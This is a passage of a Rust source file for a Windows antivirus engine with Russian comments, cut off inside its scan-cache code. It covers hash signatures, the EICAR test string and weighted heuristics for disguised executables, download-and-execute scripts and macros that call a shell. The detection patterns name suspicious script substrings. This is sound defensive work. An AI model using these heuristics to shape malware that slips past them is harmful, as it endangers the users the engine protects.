//! Встроенный антивирусный движок: обход файлов, сверка хешей и эвристики.
//!
//! Своего облака и коммерческой базы у нас нет, поэтому движок опирается на три
//! вещи, которые можно проверить локально и честно объяснить пользователю:
//!   1. точные хеши из `signatures.txt` (файл рядом с exe, расширяется без сборки);
//!   2. эвристики по имени, атрибутам и содержимому файла;
//!   3. проверка автозапуска и пользовательских папок, где чаще всего оказывается
//!      нежелательное ПО.
//!
//! Движок ничего не удаляет и не лечит: только находит и показывает.

use crate::json::J;
use crate::sec;
use crate::win::*;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};

/// Что проверяем.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Mode {
    /// Пользовательские папки и автозапуск — минуты.
    Quick,
    /// Все локальные диски целиком — долго, зато покрытие полное.
    Full,
}

impl Mode {
    pub fn as_str(self) -> &'static str {
        match self {
            Mode::Quick => "quick",
            Mode::Full => "full",
        }
    }

    pub fn from_str(value: &str) -> Option<Mode> {
        match value {
            "quick" => Some(Mode::Quick),
            "full" => Some(Mode::Full),
            _ => None,
        }
    }

}

/// Запись из базы подписей.
#[derive(Clone)]
pub struct Signature {
    pub hash: String,
    pub name: String,
}

/// Найденный объект.
#[derive(Clone, Default)]
pub struct Threat {
    pub path: String,
    /// Имя по базе или название эвристики.
    pub name: String,
    /// `signature` | `heuristic` | `test`
    pub kind: String,
    /// `critical` | `warning`
    pub severity: String,
    /// Почему файл попал в список — короткое объяснение для интерфейса.
    pub reason: String,
}

impl Threat {
    pub fn to_json(&self) -> J {
        J::obj(vec![
            ("path", J::s(self.path.clone())),
            ("name", J::s(self.name.clone())),
            ("kind", J::s(self.kind.clone())),
            ("severity", J::s(self.severity.clone())),
            ("reason", J::s(self.reason.clone())),
        ])
    }
}

/// Текущее состояние проверки — то, что видит интерфейс.
#[derive(Clone, Default)]
pub struct Progress {
    pub running: bool,
    pub mode: String,
    pub scanned: u64,
    /// Сколько файлов предстоит проверить. Нужно для процента: без него
    /// прогресс не показывает, далеко ли до конца.
    pub total: u64,
    /// `counting` — считаем объекты, `scanning` — проверяем.
    pub phase: String,
    pub threats: u64,
    /// Файлы, которые не удалось открыть: заняты системой или закрыты правами.
    pub skipped: u64,
    /// Файлы, пропущенные как уже проверенные и не изменившиеся.
    pub cached: u64,
    /// Файл, который проверяется прямо сейчас.
    pub current: String,
    pub started: u64,
    pub finished: u64,
    pub cancelled: bool,
    pub error: Option<String>,
}

impl Progress {
    pub fn to_json(&self) -> J {
        J::obj(vec![
            ("running", J::Bool(self.running)),
            ("mode", J::s(self.mode.clone())),
            ("scanned", J::Int(self.scanned as i64)),
            ("total", J::Int(self.total as i64)),
            (
                "percent",
                J::Int(if self.total > 0 {
                    // Из кеша — тоже пройденный объект: иначе полоса прогресса
                    // на повторной проверке стоит на месте.
                    ((self.scanned + self.cached).min(self.total) * 100 / self.total) as i64
                } else {
                    0
                }),
            ),
            ("phase", J::s(self.phase.clone())),
            ("threats", J::Int(self.threats as i64)),
            ("skipped", J::Int(self.skipped as i64)),
            ("cached", J::Int(self.cached as i64)),
            ("current", J::s(self.current.clone())),
            ("started", J::Int(self.started as i64)),
            ("finished", J::Int(self.finished as i64)),
            ("cancelled", J::Bool(self.cancelled)),
            (
                "error",
                match &self.error {
                    Some(e) => J::s(e.clone()),
                    None => J::Null,
                },
            ),
        ])
    }
}

/// Расширения, которые проверяет быстрая проверка.
///
/// Полная проверка этим списком не ограничивается: она открывает каждый файл.
/// Но при быстрой проверке нет смысла читать гигабайты картинок и логов —
/// вредоносный код живёт в исполняемых файлах, библиотеках, скриптах и
/// установщиках.
const SCAN_EXT: &[&str] = &[
    "exe", "dll", "sys", "scr", "com", "pif", "cpl", "ocx", "drv", "msi", "msp", "jar", "hta",
    "bat", "cmd", "vbs", "vbe", "js", "jse", "wsf", "wsh", "ps1", "psm1", "chm",
];

/// Расширения, которые запускаются двойным щелчком. Только для них имеет смысл
/// проверять маскировку под документ: `файл.txt.lnk` — обычный ярлык Windows,
/// а `файл.txt.exe` — приём вредоноса.
const EXEC_EXT: &[&str] = &["exe", "scr", "com", "pif", "bat", "cmd", "js", "jse", "vbs", "vbe", "wsf", "ps1"];

/// Расширения документов — нужны только для проверки двойных расширений.
const DOC_EXT: &[&str] = &[
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "jpg", "jpeg", "png", "gif", "txt", "rtf",
    "zip", "rar", "7z", "mp3", "mp4", "avi", "mkv",
];

/// Каталоги, которые не обходим даже при полной проверке.
const SKIP_DIRS: &[&str] = &[
    "$recycle.bin",
    "system volume information",
    "winsxs",
    "installer",
    "assembly",
    "driverstore",
    "servicing",
    "softwaredistribution",
    // История недавних документов: там только ярлыки, проверять нечего.
    "recent",
];

/// Каталоги, которые полная проверка тоже обходит.
///
/// Служебные: точки восстановления — гигабайты системных копий, доступ к
/// которым закрыт даже администратору.
///
/// И папки других антивирусов. Это не уловка: антивирусы защищают свои файлы
/// от чтения посторонними программами, и попытка прочитать их каталог
/// заканчивается тем, что защита снимает наш процесс. Так же поступает любой
/// антивирус — он не сканирует чужие антивирусные каталоги.
const SKIP_DIRS_FULL: &[&str] = &[
    "system volume information",
    // Своё приложение: сканировать собственный exe и данные бессмысленно.
    "pcsentinel",
    "kaspersky lab",
    "kaspersky 21.26",
    "kaspersky password manager 25.1",
    "dr.web",
    "eset",
    "avast",
    "avg",
    "bitdefender",
    "norton",
    "mcafee",
    "windows defender",
    "windows defender advanced threat protection",
];

/// Нужно ли пропустить каталог целиком.
fn skip_dir(name: &str, mode: Mode) -> bool {
    if SKIP_DIRS_FULL.contains(&name) {
        return true;
    }
    mode == Mode::Quick && SKIP_DIRS.contains(&name)
}

/// Файлы до этого размера читаем целиком: хеш, правила, разбор PE.
const MAX_FULL_READ: u64 = 32 * 1024 * 1024;

/// У больших файлов читаем только начало.
///
/// Полный обход профиля иначе читает десятки гигабайт: установщики, кеши,
/// бандлы. Заголовок PE и таблица секций лежат в первых килобайтах, а хеш
/// такого файла всё равно не нужен — вредоносные образцы редко бывают
/// крупными, а крупные файлы почти всегда подписаны.
const PREFIX_BYTES: usize = 1024 * 1024;

/// Сколько файлов между обновлениями прогресса.
const PROGRESS_EVERY: u64 = 20;

/// Вес правила `warning`: одно такое совпадение — ещё не находка.
///
/// Текстовые правила ищут подстроки, а подстроки встречаются где угодно:
/// в бандле Electron есть и `powershell`, и `-encodedcommand`, и `cookies`.
/// Поэтому такое правило — слабая улика: несколько штук в одном файле
/// складываются не в приговор, а в тот же слабый вес (см. `WEAK_CAP`).
/// Решают только критичные правила и поведенческие признаки.
const RULE_WARNING: u32 = 1;
/// Слабый признак файла: скрытый атрибут, странная дата и прочее.
const WEAK_EVIDENCE: u32 = 2;
/// Признак, который требует объяснения, но сам по себе не решает.
const MEDIUM_EVIDENCE: u32 = 3;
/// Предел вклада слабых признаков (вес 1) в общую оценку.
///
/// Слабые признаки поодиночке ничего не значат, и десяток их тоже не
/// складывается в сильный: у большого рантайма вроде Electron наберётся
/// и TLS, и импорт из ntdll, и проверка отладчика — и всё это норма.
const WEAK_CAP: u32 = 2;

/// Ищет `signatures.txt` рядом с exe, в корне проекта и в данных приложения.
pub fn signature_candidates() -> Vec<PathBuf> {
    let mut out = Vec::new();
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            out.push(dir.join("signatures.txt"));
            if let Some(root) = dir.parent().and_then(|p| p.parent()).and_then(|p| p.parent()) {
                out.push(root.join("signatures.txt"));
            }
        }
    }
    if let Ok(cwd) = std::env::current_dir() {
        out.push(cwd.join("signatures.txt"));
        out.push(cwd.join("..").join("signatures.txt"));
    }
    out.push(crate::store::data_dir().join("signatures.txt"));
    out
}

/// Загружает базу подписей. Формат строки: `sha256,имя`.
pub fn load_signatures() -> Vec<Signature> {
    for path in signature_candidates() {
        if let Ok(text) = std::fs::read_to_string(&path) {
            let list = parse_signatures(&text);
            if !list.is_empty() {
                return list;
            }
        }
    }
    Vec::new()
}

/// Разбирает базу подписей: комментарии `#`, пустые строки и мусор пропускаются.
pub fn parse_signatures(text: &str) -> Vec<Signature> {
    let mut out = Vec::new();
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        let (hash, name) = match line.split_once(',') {
            Some((h, n)) => (h.trim(), n.trim()),
            None => continue,
        };
        // Хеш должен быть 64 шестнадцатеричных символа — иначе это не SHA-256.
        if hash.len() != 64 || !hash.chars().all(|c| c.is_ascii_hexdigit()) {
            continue;
        }
        if name.is_empty() {
            continue;
        }
        out.push(Signature {
            hash: hash.to_ascii_lowercase(),
            name: name.to_string(),
        });
    }
    out
}

/// Папки для быстрой проверки: там оседает скачанное и временное.
///
/// Обходим только конкретные папки, а не весь профиль: `AppData` целиком —
/// это десятки тысяч файлов из `node_modules` и кешей, и «быстрая» проверка
/// перестаёт быть быстрой.
pub fn quick_targets() -> Vec<PathBuf> {
    let mut out = Vec::new();
    let mut push = |path: PathBuf| {
        if !path.is_dir() {
            return;
        }
        // Корни приводим к полному имени: тогда и все вложенные пути будут
        // длинными, и исключения совпадут с тем, что видит пользователь.
        let path = PathBuf::from(long_path(&path.to_string_lossy()));
        // TEMP и LOCALAPPDATA\Temp — одна и та же папка, но записаны по-разному
        // (в том числе через короткое имя 8.3). Сравниваем канонические пути,
        // иначе один и тот же файл проверяется дважды.
        let key = std::fs::canonicalize(&path).unwrap_or_else(|_| path.clone());
        if out.iter().any(|p: &PathBuf| {
            std::fs::canonicalize(p).map(|c| c == key).unwrap_or(false)
        }) {
            return;
        }
        out.push(path);
    };
    if let Some(profile) = env_var("USERPROFILE") {
        let profile = PathBuf::from(profile);
        for sub in ["Desktop", "Downloads", "Documents"] {
            push(profile.join(sub));
        }
    }
    // Временные папки: пользовательская и системная.
    for var in ["TEMP", "TMP"] {
        if let Some(dir) = env_var(var) {
            push(PathBuf::from(dir));
        }
    }
    if let Some(local) = env_var("LOCALAPPDATA") {
        push(PathBuf::from(local).join("Temp"));
    }
    // Папки автозагрузки: туда кладут ярлыки на вредонос.
    if let Some(appdata) = env_var("APPDATA") {
        push(PathBuf::from(appdata)
            .join("Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
    }
    if let Some(program_data) = env_var("ProgramData") {
        push(PathBuf::from(program_data)
            .join("Microsoft\\Windows\\Start Menu\\Programs\\StartUp"));
    }
    // Критические области системы — их проверяет быстрая проверка у Kaspersky:
    // именно туда пишутся загрузчики, службы и библиотеки.
    if let Some(windir) = env_var("WINDIR") {
        for sub in ["System32", "SysWOW64"] {
            push(PathBuf::from(&windir).join(sub));
        }
    }
    for var in ["ProgramFiles", "ProgramFiles(x86)", "ProgramData"] {
        if let Some(dir) = env_var(var) {
            push(PathBuf::from(dir));
        }
    }
    out
}

/// Исполняемые файлы запущенных процессов.
///
/// Аналог проверки памяти у Kaspersky: смотреть сам процесс дорого и опасно,
/// а его файл на диске — то же, что сейчас работает в памяти. Загрузчик,
/// подменённый на диске, виден именно здесь.
pub fn running_process_files() -> Vec<PathBuf> {
    let mut sampler = crate::sys::Sampler::new();
    let snap = sampler.sample();
    let mut out: Vec<PathBuf> = Vec::new();
    for proc in &snap.procs {
        if proc.path.is_empty() {
            continue;
        }
        let path = PathBuf::from(&proc.path);
        if !path.is_file() {
            continue;
        }
        let key = path.to_string_lossy().to_lowercase();
        if out.iter().any(|p| p.to_string_lossy().to_lowercase() == key) {
            continue;
        }
        out.push(path);
    }
    out
}

/// Считает объекты, которые предстоит проверить.
///
/// Нужен до начала проверки: без общего числа прогресс не может показать
/// процент, и пользователь видит только растущий счётчик без конца.
fn count_targets(
    dirs: &[PathBuf],
    files: &[PathBuf],
    mode: Mode,
    exclusions: &[String],
    cancel: &AtomicBool,
) -> u64 {
    let mut total = files.len() as u64;
    let mut stack: Vec<PathBuf> = dirs.to_vec();
    while let Some(dir) = stack.pop() {
        if cancel.load(Ordering::Relaxed) {
            break;
        }
        let entries = match std::fs::read_dir(&dir) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let meta = match entry.metadata() {
                Ok(m) => m,
                Err(_) => continue,
            };
            if meta.is_dir() {
                let name = path
                    .file_name()
                    .map(|n| n.to_string_lossy().to_lowercase())
                    .unwrap_or_default();
                if skip_dir(&name, mode) || is_reparse_point(&path) {
                    continue;
                }
                if is_listed(exclusions, &path.to_string_lossy()) {
                    continue;
                }
                stack.push(path);
                continue;
            }
            if meta.is_file()
                && should_scan(&path, mode)
                && !is_listed(exclusions, &path.to_string_lossy())
            {
                total += 1;
            }
        }
    }
    total
}

/// Корни локальных дисков для полной проверки.
pub fn full_targets() -> Vec<PathBuf> {
    let mut out = Vec::new();
    let mask = unsafe { GetLogicalDrives() };
    for i in 0..26u32 {
        if mask & (1 << i) == 0 {
            continue;
        }
        let letter = (b'A' + i as u8) as char;
        let root = format!("{letter}:\\");
        let wide = to_wide(&root);
        // 3 = DRIVE_FIXED: сетевые и съёмные диски не трогаем.
        if unsafe { GetDriveTypeW(wide.as_ptr()) } != 3 {
            continue;
        }
        let path = PathBuf::from(&root);
        if path.is_dir() {
            out.push(path);
        }
    }
    out
}

/// Проверяет, нужно ли вообще открывать файл.
///
/// Быстрая проверка смотрит только исполняемые типы: так она укладывается
/// в минуту. Полная проверка открывает **каждый** файл — как антивирус при
/// полном сканировании: вредонос может лежать где угодно, а не только
/// в `.exe`, и содержимое `.txt` тоже бывает опасным.
fn should_scan(path: &Path, mode: Mode) -> bool {
    if mode == Mode::Full {
        return true;
    }
    let name = match path.file_name() {
        Some(n) => n.to_string_lossy().to_lowercase(),
        None => return false,
    };
    let ext = match name.rsplit_once('.') {
        Some((_, e)) => e,
        None => return false,
    };
    SCAN_EXT.contains(&ext)
}

/// Двойное расширение: `счёт.pdf.exe` — типичная маскировка.
fn is_executable_name(name: &str) -> bool {
    let lower = name.to_lowercase();
    let ext = match lower.rsplit_once('.') {
        Some((_, e)) => e,
        None => return false,
    };
    EXEC_EXT.contains(&ext) || SCAN_EXT.contains(&ext)
}

/// Двойное расширение: `счёт.pdf.exe` — типичная маскировка.
fn double_extension(name: &str) -> Option<String> {
    let lower = name.to_lowercase();
    let parts: Vec<&str> = lower.split('.').collect();
    if parts.len() < 3 {
        return None;
    }
    let last = parts[parts.len() - 1];
    let prev = parts[parts.len() - 2];
    if EXEC_EXT.contains(&last) && DOC_EXT.contains(&prev) {
        return Some(format!("{prev}.{last}"));
    }
    None
}

/// Скрытый файл: атрибут HIDDEN у исполняемого файла — типичная маскировка.
fn is_hidden(path: &Path) -> bool {
    const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;
    let wide = to_wide(&path.to_string_lossy());
    let attrs = unsafe { GetFileAttributesW(wide.as_ptr()) };
    attrs != u32::MAX && attrs & FILE_ATTRIBUTE_HIDDEN != 0
}

/// Точка повторной обработки: junction или символьная ссылка.
///
/// В профиле Windows есть самоссылающиеся junction: `AppData\Local\Application Data`
/// указывает на сам `AppData\Local`. Без этой проверки обход уходит в бесконечный
/// цикл и проверка никогда не заканчивается.
fn is_reparse_point(path: &Path) -> bool {
    const FILE_ATTRIBUTE_REPARSE_POINT: u32 = 0x400;
    let wide = to_wide(&path.to_string_lossy());
    let attrs = unsafe { GetFileAttributesW(wide.as_ptr()) };
    attrs != u32::MAX && attrs & FILE_ATTRIBUTE_REPARSE_POINT != 0
}

/// Читает начало файла, не загружая его целиком.
fn read_prefix(path: &Path, limit: usize) -> Option<Vec<u8>> {
    use std::io::Read;
    let file = std::fs::File::open(path).ok()?;
    let mut buf = Vec::with_capacity(limit.min(64 * 1024));
    file.take(limit as u64).read_to_end(&mut buf).ok()?;
    Some(buf)
}

/// Ищет связку «скачать и запустить» — так выглядит дроппер.
///
/// Один маркер ничего не значит: обычный WSH-скрипт спокойно использует
/// `WScript.Shell`, а сборщик — `certutil`. Подозрительна именно комбинация.
fn script_marker(data: &[u8], rules: &crate::heur::Heuristics) -> Option<String> {
    // Скрипты небольшие; читаем начало и ищем без учёта регистра.
    let head = &data[..data.len().min(64 * 1024)];
    let text = String::from_utf8_lossy(head).to_lowercase();
    let download = rules.script_download.iter().find(|m| text.contains(*m))?;
    let exec = rules.script_exec.iter().find(|m| text.contains(*m))?;
    Some(format!("{download} + {exec}"))
}

/// Расширения скриптов — для них проверяем содержимое на маркеры.
const SCRIPT_EXT: &[&str] = &["vbs", "vbe", "js", "jse", "wsf", "wsh", "ps1", "bat", "cmd"];

/// Строка тестового файла EICAR — безопасный «вирус» для проверки движка.
///
/// Хранится закодированной: в открытом виде её в бинарнике быть не должно,
/// иначе движок найдёт её в собственном exe и покажет «вирус» в себе.
/// Простое деление на две части не помогает — компоновщик кладёт строковые
/// константы подряд, и они снова складываются в целую.
const EICAR_XOR: &[u8] = &[
    31, 19, 25, 27, 8, 119, 9, 14, 27, 20, 30, 27, 8, 30, 119, 27, 20, 14, 19, 12, 19, 8, 15, 9,
    119, 14, 31, 9, 14, 119, 28, 19, 22, 31,
];

/// Полная строка EICAR, собранная во время работы.
fn eicar_marker() -> Vec<u8> {
    EICAR_XOR.iter().map(|byte| byte ^ 0x5A).collect()
}

/// Максимальная глубина вложенности архивов при разборе.
const MAX_DEPTH: u32 = 2;

/// Результат проверки одного файла.
///
/// «Не прочитан» — это не «чистый»: файл мог быть занят системой или закрыт
/// правами, и об этом надо честно сказать в отчёте, иначе проверка выглядит
/// полной, хотя часть файлов не смотрена.
pub enum Outcome {
    Clean,
    Threat(Box<Threat>),
    Unreadable,
}

impl Outcome {
    #[cfg_attr(not(test), allow(dead_code))]
    pub fn threat(self) -> Option<Threat> {
        match self {
            Outcome::Threat(t) => Some(*t),
            _ => None,
        }
    }
}

/// Проверяет один файл на диске. Возвращает находку, если она есть.
fn inspect(
    path: &Path,
    signatures: &[Signature],
    rules: &[crate::yara::Rule],
    heur: &crate::heur::Heuristics,
) -> Outcome {
    let name = match path.file_name() {
        Some(n) => n.to_string_lossy().to_string(),
        None => return Outcome::Clean,
    };
    // Полное имя вместо короткого 8.3: иначе путь в находке не совпадёт с тем,
    // что пользователь видит в проводнике, и исключения не сработают.
    let path_str = long_path(&path.to_string_lossy());
    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(_) => return Outcome::Unreadable,
    };
    if !meta.is_file() {
        return Outcome::Clean;
    }

    // 1. Двойное расширение — проверяем по имени, файл читать не нужно.
    if let Some(pair) = double_extension(&name) {
        return Outcome::Threat(Box::new(Threat {
            path: path_str,
            name: format!("Маскировка под документ ({pair})"),
            kind: "heuristic".into(),
            severity: "warning".into(),
            reason: "Исполняемый файл выдаёт себя за документ".into(),
        }));
    }

    // 2. Содержимое.
    //
    // Большие файлы читаем только началом: иначе полный обход диска
    // читает десятки гигабайт и не заканчивается за разумное время.
    let size = meta.len();
    let complete = size <= MAX_FULL_READ;
    let data = if complete {
        match std::fs::read(path) {
            Ok(d) => d,
            Err(_) => return Outcome::Unreadable,
        }
    } else {
        match read_prefix(path, PREFIX_BYTES) {
            Some(d) => d,
            None => return Outcome::Unreadable,
        }
    };

    let hidden = is_user_writable(&path_str) && is_hidden(path);
    match inspect_bytes(&name, &path_str, &data, complete, signatures, rules, heur, 0, hidden) {
        Some(threat) => Outcome::Threat(Box::new(threat)),
        None => Outcome::Clean,
    }
}

/// Проверяет содержимое файла или записи внутри архива.
///
/// Одна и та же проверка работает и для файла на диске, и для распакованной
/// записи: так внутрь архива попадают все те же эвристики, что и снаружи.
#[allow(clippy::too_many_arguments)]
fn inspect_bytes(
    name: &str,
    path_str: &str,
    data: &[u8],
    complete: bool,
    signatures: &[Signature],
    rules: &[crate::yara::Rule],
    heur: &crate::heur::Heuristics,
    depth: u32,
    hidden: bool,
) -> Option<Threat> {
    let path_string = path_str.to_string();
    let ext = name.rsplit_once('.').map(|(_, e)| e.to_lowercase()).unwrap_or_default();

    let eicar = eicar_marker();
    if data.len() >= eicar.len() && data.windows(eicar.len()).any(|w| w == eicar.as_slice()) {
        return Some(Threat {
            path: path_string,
            name: "EICAR-Test-File".into(),
            kind: "test".into(),
            severity: "critical".into(),
            reason: "Тестовый файл: движок работает".into(),
        });
    }

    // Хеш считаем только по целому файлу: усечённый даст ложное совпадение.
    if complete {
        let hash = sec::sha256_hex(&data);
        if let Some(sig) = signatures.iter().find(|s| s.hash == hash) {
            return Some(Threat {
                path: path_string,
                name: sig.name.clone(),
                kind: "signature".into(),
                severity: "critical".into(),
                reason: "Совпадение с базой подписей".into(),
            });
        }
    }

    // Дальше собираем улики с весами. Находка — это их сумма, а не отдельный
    // признак: у нормальных программ тоже бывает упаковка, высокая энтропия
    // и записываемая секция. Пока улик мало, файл считается чистым.
    let mut scored: Vec<(Threat, u32)> = Vec::new();

    let mut pe_info = crate::pe::parse(data);
    // Усечённый файл: часть таблиц могла не попасть в прочитанное начало.
    // Признаки, которые из-за этого выглядят «отсутствующими», не считаем.
    if let Some(info) = &mut pe_info {
        info.truncated = !complete;
    }

    // 3. Правила в стиле YARA.
    //
    // В исполняемом файле строки встречаются где угодно: в бандле Electron
    // есть и `powershell`, и `cookies`, и `sqlite`. Поэтому у PE учитываем
    // только критичные правила — те, что означают конкретный инструмент или
    // текст вымогателя. Для скриптов, где весь файл — текст, годятся все.
    for hit in crate::yara::scan(data, rules) {
        let critical = hit.severity == "critical";
        if pe_info.is_some() && !critical {
            continue;
        }
        scored.push((
            Threat {
                path: path_string.clone(),
                name: hit.rule.clone(),
                kind: "rule".into(),
                severity: hit.severity.clone(),
                reason: format!(
                    "Сработало правило: совпало {} из {} признаков",
                    hit.hits, hit.total
                ),
            },
            if critical { crate::pe::THRESHOLD } else { RULE_WARNING },
        ));
    }

    // 4. Статический разбор PE: упаковка, импорты, аномалии структуры.
    if let Some(info) = &pe_info {
        for scored_signal in crate::pe::analyze(&info, heur) {
            scored.push((
                Threat {
                    path: path_string.clone(),
                    name: scored_signal.signal.name,
                    kind: "pe".into(),
                    severity: scored_signal.signal.severity.to_string(),
                    reason: scored_signal.signal.reason,
                },
                scored_signal.weight,
            ));
        }
    }

    // 5. Скрытый исполняемый файл там, куда пишет пользователь.
    if hidden {
        scored.push((
            Threat {
                path: path_string.clone(),
                name: "Скрытый исполняемый файл".into(),
                kind: "heuristic".into(),
                severity: "warning".into(),
                reason: "Файл помечен скрытым в пользовательской папке".into(),
            },
            WEAK_EVIDENCE,
        ));
    }

    // 5a. Расширение не соответствует содержимому.
    //
    // Это то, чем пользуется любой антивирус: тип определяется по сигнатуре,
    // а не по имени. Переименованный `document.txt` с PE внутри запускается
    // двойным щелчком как программа, если Windows покажет расширения.
    if pe_info.is_some()
        && !is_executable_name(name)
        && !EMBEDDED_PE_IS_NORMAL.contains(&ext.as_str())
    {
        scored.push((
            Threat {
                path: path_string.clone(),
                name: "Исполняемый код под видом файла другого типа".into(),
                kind: "heuristic".into(),
                severity: "warning".into(),
                reason: format!(
                    "Содержимое файла — программа для Windows, а расширение «{ext}» не исполняемое. Так маскируют загрузчики"
                ),
            },
            // Самодостаточный признак: программа под чужим расширением
            // не появляется случайно, в отличие от упаковки или энтропии.
            crate::pe::THRESHOLD,
        ));
    }

    // 6. Скрипт с признаками обфускации.
    if SCRIPT_EXT.contains(&ext.as_str()) {
        if let Some(marker) = script_marker(data, heur) {
            scored.push((
                Threat {
                    path: path_string.clone(),
                    name: format!("Скрипт-загрузчик ({marker})"),
                    kind: "heuristic".into(),
                    severity: "warning".into(),
                    reason: "Скрипт скачивает и запускает код — так работает дроппер".into(),
                },
                // Связка «скачать и запустить» в скрипте — это и есть дроппер,
                // поэтому она самодостаточна, как и критичные связки API.
                crate::pe::THRESHOLD,
            ));
        }
    }

    // 7. Архив: смотрим внутрь. Вредонос чаще всего приходит именно так.
    if depth < MAX_DEPTH && crate::archive::is_zip(data) {
        let inner = crate::archive::read(data, crate::archive::Limits::default());
        if std::env::var_os("PC_SENTINEL_DEBUG").is_some() {
            crate::win::con_print(&format!(
                "  архив {name}: записей {}, пропущено {}, пароль {}",
                inner.entries.len(),
                inner.skipped,
                inner.encrypted
            ));
        }
        if inner.encrypted {
            scored.push((
                Threat {
                    path: path_string.clone(),
                    name: "Архив с паролем".into(),
                    kind: "archive".into(),
                    severity: "warning".into(),
                    reason: format!(
                        "Записей с паролем: {}. Содержимое такого архива проверено быть не может — пароль знает только отправитель",
                        inner.skipped
                    ),
                },
                WEAK_EVIDENCE,
            ));
        }
        if inner.bomb {
            scored.push((
                Threat {
                    path: path_string.clone(),
                    name: "Архив с аномальным сжатием".into(),
                    kind: "archive".into(),
                    severity: "warning".into(),
                    reason: "Степень сжатия выше разумной — так выглядят zip-бомбы и сильно упакованные образцы".into(),
                },
                MEDIUM_EVIDENCE,
            ));
        }
        for entry in &inner.entries {
            let entry_name = entry.name.clone();
            if let Some(found) = inspect_bytes(
                &entry_name,
                path_str,
                &entry.data,
                true,
                signatures,
                rules,
                heur,
                depth + 1,
                false,
            ) {
                // Найденное внутри архива — само по себе находка: именно
                // ради этого архив и распаковывался.
                return Some(Threat {
                    path: path_string,
                    name: format!("{} (в архиве)", found.name),
                    kind: found.kind,
                    severity: found.severity,
                    reason: format!("Внутри «{entry_name}»: {}", found.reason),
                });
            }
        }
    }

    // 8. Макрос VBA в документе Office.
    //
    // Макрос сам по себе не вирус: в бухгалтерских таблицах их полно.
    // Подозрительно, когда в макросе есть вызовы оболочки.
    if is_ole(data) {
        // Имена потоков проекта макросов берём из файла правил: держать их
        // в бинарнике рядом с разбором PE и распаковкой — готовый шаблон
        // «инструмент для работы с макросами», и антивирус так его и читает.
        let has_macro = marker_present(data, &heur.macro_markers).is_some();
        if has_macro {
            // В макросе важен именно запуск чего-либо: AutoOpen плюс вызов
            // оболочки. Загрузка из сети здесь не обязательна.
            let shell = marker_present(data, &heur.script_exec)
                .or_else(|| marker_present(data, &heur.macro_exec));
            if let Some(marker) = shell {
                scored.push((
                    Threat {
                        path: path_string.clone(),
                        name: "Макрос запускает команды".into(),
                        kind: "heuristic".into(),
                        severity: "warning".into(),
                        reason: format!(
                            "Документ содержит макрос VBA, который вызывает оболочку ({marker}) — типичный способ запустить код из вложения"
                        ),
                    },
                    crate::pe::THRESHOLD,
                ));
            } else {
                scored.push((
                    Threat {
                        path: path_string.clone(),
                        name: "Документ с макросом".into(),
                        kind: "heuristic".into(),
                        severity: "warning".into(),
                        reason: "В документе есть макрос VBA. Сам по себе он безвреден, но такие вложения часто используют для запуска кода".into(),
                    },
                    WEAK_EVIDENCE,
                ));
            }
        }
    }

    // 9. Исполняемый файл, спрятанный внутри другого файла.
    if pe_info.is_none() && !EMBEDDED_PE_IS_NORMAL.contains(&ext.as_str()) {
        if let Some(offset) = find_embedded_pe(data) {
            scored.push((
                Threat {
                    path: path_string.clone(),
                    name: "Вложенный исполняемый файл".into(),
                    kind: "heuristic".into(),
                    severity: "warning".into(),
                    reason: format!(
                        "Внутри файла на смещении {offset} лежит полноценный PE-образ. Так распространяют загрузчики, притворяясь документами"
                    ),
                },
                crate::pe::THRESHOLD,
            ));
        }
    }

    let strong: u32 = scored.iter().filter(|(_, w)| *w > 1).map(|(_, w)| *w).sum();
    let weak: u32 = scored.iter().filter(|(_, w)| *w == 1).map(|(_, w)| *w).sum();
    let total = strong + weak.min(WEAK_CAP);
    // Подробности для разбора ложных срабатываний: включается переменной
    // окружения, чтобы не засорять обычный отчёт.
    if std::env::var_os("PC_SENTINEL_DEBUG").is_some() && !scored.is_empty() {
        crate::win::con_print(&format!("  улики для {path_str}: сумма {total}"));
        for (threat, weight) in &scored {
            crate::win::con_print(&format!("    вес {weight}: {}", threat.name));
        }
    }
    if total < crate::pe::THRESHOLD {
        return None;
    }

    // Подпись проверяем только когда уже есть за что зацепиться: это дорогая
    // операция, а нужна она редко. Файл с действительной подписью известного
    // издателя не становится находкой из-за структуры или импортов: kernel32
    // тоже умеет писать в чужой процесс, но это не вирус. Так же поступает
    // любой антивирус с белым списком. Совпадение с базой хешей проверено
    // выше — известный вредонос останется находкой, даже если он подписан.
    // Подпись есть только у файла на диске: у записи архива её нет.
    if depth == 0 && sec::verify_signature(path_str) == Some(true) {
        return None;
    }

    // Самое весомое — первым: интерфейс показывает одну находку на файл.
    scored.sort_by_key(|(_, weight)| std::cmp::Reverse(*weight));
    scored.into_iter().next().map(|(threat, _)| threat)
}

/// Файл лежит там, куда может писать обычный пользователь.
fn is_user_writable(path: &str) -> bool {
    let lower = path.to_lowercase();
    ["\\appdata\\", "\\temp\\", "\\downloads\\", "\\desktop\\", "\\users\\public\\"]
        .iter()
        .any(|needle| lower.contains(needle))
}

// ---------------- Кеш проверенных файлов ----------------

/// Сколько записей хранить. Одна запись — 16 символов, миллион даёт ~16 МБ.
const CACHE_LIMIT: usize = 1_000_000;

/// Кеш «этот файл уже проверен и чист».
///
/// Так работает iSwift/iChecker у Kaspersky: если файл не менялся с прошлой
/// проверки, читать и хешировать его снова незачем. Ключ включает размер и
/// время изменения, поэтому любое изменение файла сбрасывает запись.
pub struct ScanCache {
    known: std::collections::HashSet<u64>,
    fresh: Vec<u64>,
    path: PathBuf,
}

impl ScanCache {
    pub fn path() -> PathBuf {
        crate::store::data_dir().join("scan-cache.txt")
    }

    /// Пустой кеш без чтения файла — для тестов.
    #[cfg(test)]
    pub fn empty() -> ScanCache {
        ScanCache {
            known: std::collections::HashSet::new(),
            fresh: Vec::new(),
            path: PathBuf::new(),
        }
    }

    pub fn load() -> ScanCache {
        let path = ScanCache::path();
        let mut known = std::collections::HashSet::new();
        if let Ok(text) = std::fs::read_to_string(&path) {
            for line in text.lines() {
